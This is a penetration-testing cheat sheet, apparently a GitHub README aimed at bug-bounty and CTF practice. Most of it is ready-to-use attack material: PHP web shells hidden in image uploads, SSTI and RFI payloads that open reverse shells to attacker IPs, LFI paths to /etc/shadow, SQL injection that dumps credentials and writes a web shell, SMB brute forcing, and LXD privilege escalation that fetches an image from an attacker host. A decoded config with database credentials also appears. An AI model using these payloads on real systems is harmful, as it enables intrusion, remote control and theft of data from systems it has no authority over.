
# Adding new topics daily
<img alt="GIF" src="https://media1.giphy.com/media/Rm1p7xp3Odl2o/giphy.gif?raw=true" width="500" height="320" />


# I need some time to make it useful :)

### Contents:
  - [Categories](#contents)
      - [Bug Bounty 🤖](#bugbounty)
      - [Linux 👨🏽‍💻](#linux)
      - [Windows ](#windows)
      - [Linux privesc 💫](#linux-privesc)
      - [Windows privesc 😃](#windows-privesc)
      - [Extra notes 🗒](#notes)



### BugBounty
  - [Bypass file upload filtering](#bypass-file-upload-filtering)
  - [XSS](#xxe-basic-payloads)
  - [SSTI](#server-side-template-injection-ssti-to-rce)
  - [LFI](#local-file-inclusion-lfi-payloads)
  - [RFI](#remote-file-inclusion-rfi)
  - [SQLI](#sql-injection-payload-list)

### Linux
 - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
 - [Useful find commands](#useful-find-commands-example)
 - [Simple bash port scanner](#simple-bash-port-scanner)
 - [File permission](https://github.com/akr3ch/CS-AIO-CheatSheet/edit/main/README.md#scecific-permission-for-specific-user)
 - [SMB enumeration(port 445)](#smb-enumeration)
### Windows
- [Basic enumeration](#basic-enumeration-on-linux-and-windows)

### Linux Privesc
  - [LXC/LXD container](#lxclxd-privilege-escalation)

-------------------------------------------------------------------------------------------------------------
# Bypass File Upload Filtering

`GIF89a`
```
GIF89a;
<?
system($_GET['cmd']);
?>
```

`exiftool`

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg

mv evil.jpg evil.php.jpg
```
-------------------------------------------------------------------------------------------------------------


# XXE basic payloads

```
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
```
------------------------------------------------------------------------------------------------------------
# Server Side Template Injection (SSTI) to RCE
* At first check if the app is build in Python.
* Try this, everywhere the app is taking input from the user.

```python
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
* if the app reflects the output as `49`.Then there might be a RCE possible.
* now encode the payload in basse64.

`input`
```shell
echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
```
`output`
```
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
```
* now start a listener
```
nc -lvvp 4444
```

```python
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
```
* if everything works currectly. You should get a reverse shell.
```shell
nc -vv -lnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.130.
Ncat: Connection from 10.10.11.130:54434.
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

--------------------------------------------------------------------------------

# Remote File Inclusion (RFI)

#### Common payloads
`php:expect://id`

`php:expect://whoami`

Remote file inclusion uses pretty much the same vector as local file inclusion.

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file.

This is how they work.

So you have an unsanitized parameter, like this
```
$incfile = $_REQUEST["file"];
include($incfile.".php");
```
Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.
```
http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
```
And evil.txt will look like something like this:
```
<?php echo shell_exec("whoami");?>
```
`Or just get a reverse shell directly like this:`
```
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```
So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.
Avoid extentions

Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before version 5.3.

If it does not work you can also add a ?, this way the rest will be interpreted as url parameters.



-------------------------------------------------------------------------------------------------------------
# Local file inclusion (LFI) payloads

`../../../../../../etc/passwd`

`....//....//....//....//....//etc/passwd`

You can also try to use those insted of `/etc/passwd`
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/var/log/apache2/access.log
```

# LFI examples

*akech.com/index.php?token=`/etc/passwd%00`*

*akrech.com/index.php?page=`../../../../../../etc/passwd`*

```
http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
```
-------------------------------------------------------------------------------------------------------------
# PHP filters for LFI

```
php://filter/convert.base64-encode/resource=
```

```
php://filter/read=string.rot13/resource=
```

*example input:*

example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php

example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php

*example output:*

```
PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
```

*decode*
```
<?php
$db_name="bihtapub_db";
if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
   $con=mysql_connect("localhost","root","");
else
   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
if(!$con)...
.
.
?>

```

-------------------------------------------------------------------------------------------------------
# SQL injection payload list
`Generic SQL Injection Payloads`
```
'
''
' or "
-- or # 
' OR '1
' OR 1 -- -
'or 1=1 -- -
" OR "" = "
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
```
------------------------------------------------------------------------------------------------------
## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h examle.com -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

----------------------------------------------------------------------------------------------------------
## Basic enumeration on linux and windows
| **Linux**  | **Windows** | **Purpose of command** |
|------------|-------------|------------------------|
|`whoami`|`whoami`|Name of current user
| `uname -a`|`ver`|Operating system
|`ifconfig`|`ipconfig /all`|Network configuration
|`netstat -an`|`netstat -an`|Network connections
|`ps -ef`|`tasklist`|Running processes

-----------------------------------------------------------------------------------------------------------
# Useful find commands example

`find SUID files`
```
find / -user root -perm /4000 2>/dev/null
```
```
find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
```
```
find / -type f -name '*.txt' 2>/dev/null
```
```
find / -perm -u=s -type f 2>/dev/null
```
```
getcap -r / 2>/dev/null
```

`find and read all hidden flag.txt `
```
cat $(find / -name flag.txt 2>/dev/null)
```
# Simple bash port scanner

```shell
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/127.0.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```
-------------------------------------------------------------------------------------------------
# Scecific permission for specific user
`no permission`
```
setfacl -m u:username:000 myfolder/myfile
```
`read-write-execute`
```
setfacl -m u:username:rwx myfolder/myfile
```
`readonly permission`
```
setfacl -m u:username:r myfolder/myfile
```
`read & write permission`
```
setfacl -m u:username:rw myfolder/myfile
```

--------------------------------------------------------------------------------------------------
# SMB enumeration
## smbclient usage
List shares on a machine using NULL Session
```
smbclient -L
```
List shares on a machine using a valid username + password
```
smbclient -L <target-IP> -U username%password
```
Connect to a valid share with username + password
```
smbclient //<target>/<share$> -U username%password
```
List files on a specific share
```
smbclient //<target>/<share$> -c 'ls' password -U username
```
List files on a specific share folder inside the share
```
smbclient //<target>/<share$> -c 'cd folder; ls' password -U username
```
Download a file from a specific share folder
```
smbclient //<target>/<share$> -c 'cd folder;get desired_file_name' password -U username
```
Copy a file to a specific share folder
```
smbclient //<target>/<share$> -c 'put /var/www/my_local_file.txt .\target_folder\target_file.txt' password -U username
```
Create a folder in a specific share folder
```
smbclient //<target>/<share$> -c 'mkdir .\target_folder\new_folder' password -U username
```
Rename a file in a specific share folder
```
smbclient //<target>/<share$> -c 'rename current_file.txt new_file.txt' password -U username
```

## enum4linux usage for smb enumeration
enum4linux - General enumeration - anonymous session
```
enum4linux -a <target>
```
enum4linux - General enumeration - authenticated session
```
enum4linux -a <target> -u <user> -p <pass>
```
enum4linux - Users enumeration
```
enum4linux -u <user> -p <pass> -U <target>
```
enum4linux - Group and members enumeration
```
enum4linux -u <user> -p <pass> -G <target>
```
enum4linux - Password policy
```
enum4linux -u <user> -p <pass> -P <target>
```
## Using nmap for smb enumeration
nmap - Enum Users
```
nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbpass=Pass@1234,smbdomain=workstation -p445 192.168.1.10
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbhash=aad3b435b51404eeaad3b435b51404ee:C318D62C8B3CA508DD753DDA8CC74028,smbdomain=mydomain -p445 192.168.1.10
```
nmap - Enum Groups
```
nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
nmap - Enum Shares
```
nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=LM:NTLM,smbdomain=domain
```
nmap - OS Discovery
```
nmap -p 445 --script smb-os-discovery <target>
```
nmap - SMB Vulnerabilities on Windows
```
nmap -p 445 --script smb-vuln-ms06-025 target-IP
nmap -p 445 --script smb-vuln-ms07-029 target-IP
nmap -p 445 --script smb-vuln-ms08-067 target-IP
nmap -p 445 --script smb-vuln-ms10-054 target-IP
nmap -p 445 --script smb-vuln-ms10-061 target-IP
nmap -p 445 --script smb-vuln-ms17-010 target-IP
```
Always check for updated list on https://nmap.org/nsedoc/scripts/
map - Brute Force Accounts (be aware of account lockout!)
```
nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
```

-------------------------------------------------------------------------------------------------------
# lxc/lxd Privilege Escalation

```shell
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
```shell
python -m SimpleHTTPServer
```

*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
```shell
cd /tmp
wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
```

*import the lxc image*
```shell
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

*check the lxc image*
```
lxc image list
```

*run these commands on target machine*
```shell
lxc init
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```
